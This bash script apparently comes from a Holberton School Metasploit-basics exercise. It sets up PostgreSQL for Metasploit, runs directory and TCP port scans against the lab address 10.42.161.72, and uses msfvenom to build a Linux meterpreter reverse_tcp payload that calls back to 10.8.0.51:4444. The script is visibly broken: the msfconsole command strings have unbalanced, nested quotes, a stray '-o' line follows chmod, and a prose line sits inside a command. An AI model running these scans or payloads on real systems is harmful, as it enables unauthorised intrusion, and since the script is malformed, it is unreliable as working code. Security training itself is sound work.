#!/bin/bash

# metasploit_workflow.sh
# Description: Automates setup and usage of Metasploit with PostgreSQL

echo "[*] Starting Metasploit Workflow"

### Part 1: Setup Metasploit with PostgreSQL ###
echo "[*] Installing PostgreSQL"
sudo apt update
sudo apt install -y postgresql

echo "[*] Starting PostgreSQL service"
sudo systemctl start postgresql
sudo systemctl enable postgresql

echo "[*] Creating PostgreSQL user and database for Metasploit..."
sudo -u postgres createuser msf_user -P
sudo -u postgres createdb --owner=msf_user msf_database

# Initialize database
echo "[*] Verifying Metasploit DB connection"
msfconsole -q -x "db_status; exit"

### Part 2: Basic Usage of Metasploit ###
echo "[*] Starting Metasploit console"
msfconsole -q -x "
Check hosts in the database
msfconsole -q -x "hosts; services -p 80,3000,3001,3003,8080 10.42.161.72; exit"
search node
search express
search nginx
use auxiliary/scanner/http/dir_scanner;
set RHOSTS 10.42.161.72;
set RPORT 8080;
set PATHS /,/admin,/login,/api;
set THREADS 10;
run;
notes -t exploit.attempt -n 'Ran dir_scanner on port 8080; found /admin, /login, /api directories' 10.42.161.72;
loot -t csv -o /home/$USER/holbertonschool-cyber_security/vulnerability_research_exploitation/0x03_metasploit_basics/notes.csv;
exit"

### Part 3: Create and Use a Simple Payload ###
echo "[*] Creating payload with msfvenom..."
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.8.0.51 LPORT=4444 -f elf > payload.elf
chmod +x payload.elf
    -o /home/$USER/holbertonschool-cyber_security/vulnerability_research_exploitation/0x03_metasploit_basics/payload.elf

### Part 4: Explore Auxiliary Modules ###
echo "[*] Running auxiliary TCP port scan..."
msfconsole -q -x "
use auxiliary/scanner/portscan/tcp;
set RHOSTS 10.42.161.72;
set PORTS 80,3000,3001,3003,8080;
run;
notes -t scan -d 'TCP scan on 10.42.161.72 ports 80,3000,3001,3003,8080';
exit
"

### Part 5: Documentation and Reporting ###
echo "[*] Exporting notes and loot"
echo "[*] Saving notes to notes.csv"
msfconsole -q -x "notes; exit" > notes.csv

echo "[*] Running loot command to export loot data"
msfconsole -q -x "loot -t csv; exit"

echo "[*] Copying loot to metasploit_output/ (if exists)"
LOOT_DIR=~/.msf4/loot
if [ -d "$LOOT_DIR" ]; then
    cp -r $LOOT_DIR/* .
fi

echo "[*] Workflow complete. See 'metasploit_output/' for documentation and loot"